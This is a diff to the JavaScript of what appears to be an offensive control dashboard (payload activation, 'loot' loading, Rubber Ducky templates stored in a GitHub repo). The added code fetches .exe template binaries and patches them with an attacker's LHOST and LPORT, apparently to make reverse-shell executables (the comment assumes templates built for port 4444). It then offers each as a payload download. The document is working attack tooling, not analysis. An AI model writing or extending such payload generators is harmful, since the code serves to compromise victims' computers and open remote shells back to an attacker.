@@ -218,6 +218,35 @@ function showDashboard() {
     loadFiles();
     checkActivePayload();
     loadLoot();
+    loadTemplates();
+}
+
+async function loadTemplates() {
+    const select = document.getElementById('templateSelect');
+    // Keep the first option (Upload Local)
+    select.innerHTML = '<option value="">-- UPLOAD LOCAL FILE --</option>';
+
+    try {
+        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Templates`, {
+            headers: { 'Authorization': `Bearer ${state.token}` }
+        });
+
+        if (response.ok) {
+            const files = await response.json();
+            if (Array.isArray(files)) {
+                files.forEach(file => {
+                    if (file.name.endsWith('.exe') || file.name.endsWith('.bin')) {
+                        const option = document.createElement('option');
+                        option.value = file.path; // Store full path
+                        option.innerText = file.name;
+                        select.appendChild(option);
+                    }
+                });
+            }
+        }
+    } catch (e) {
+        console.error('Failed to load templates:', e);
+    }
 }
 
 function renderFiles(files) {
@@ -455,26 +484,54 @@ window.activatePayload = async function (attackName) {
 
 async function handlePayloadGeneration() {
     const fileInput = document.getElementById('templateFile');
+    const templateSelect = document.getElementById('templateSelect');
     const lhost = document.getElementById('lhost').value;
     const lport = document.getElementById('lport').value;
     const placeholder = document.getElementById('placeholderIp').value;
     const btn = document.getElementById('generatePayloadBtn');
 
-    if (!fileInput.files.length) {
-        alert('Please select a Template Binary first.');
-        return;
-    }
+    let buffer = null;
+    let filename = '';
+
     if (!lhost || !lport) {
         alert('Please enter LHOST and LPORT.');
         return;
     }
 
-    const file = fileInput.files[0];
-    btn.innerText = 'PATCHING...';
+    btn.innerText = 'FETCHING...';
     btn.disabled = true;
 
     try {
-        const buffer = await file.arrayBuffer();
+        // 1. Determine Source
+        if (fileInput.files.length > 0) {
+            // Local File
+            const file = fileInput.files[0];
+            buffer = await file.arrayBuffer();
+            filename = `payload_${lhost}_${lport}.exe`;
+        } else if (templateSelect.value) {
+            // Remote Template
+            const path = templateSelect.value;
+            const templateName = templateSelect.options[templateSelect.selectedIndex].text;
+
+            const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
+                headers: {
+                    'Authorization': `Bearer ${state.token}`,
+                    'Accept': 'application/vnd.github.v3.raw' // Request raw content
+                }
+            });
+
+            if (!response.ok) throw new Error('Failed to download template');
+
+            buffer = await response.arrayBuffer();
+            filename = `payload_${templateName.replace('.exe', '')}_${lhost}.exe`;
+        } else {
+            alert('Please select a Template or Upload a File.');
+            btn.innerText = 'GENERATE_PAYLOAD';
+            btn.disabled = false;
+            return;
+        }
+
+        btn.innerText = 'PATCHING...';
 
         // Use the Patcher module
         // We assume the template was made with LPORT 4444. If not, user should have specified, 
@@ -486,7 +543,7 @@ async function handlePayloadGeneration() {
         const url = window.URL.createObjectURL(patchedBlob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `payload_${lhost}_${lport}.exe`;
+        a.download = filename;
         document.body.appendChild(a);
         a.click();
         window.URL.revokeObjectURL(url);
@@ -500,7 +557,7 @@ async function handlePayloadGeneration() {
 
     } catch (e) {
         console.error(e);
-        alert('Patching Failed: ' + e.message);
+        alert('Generation Failed: ' + e.message);
         btn.innerText = 'ERROR';
         btn.disabled = false;
     }
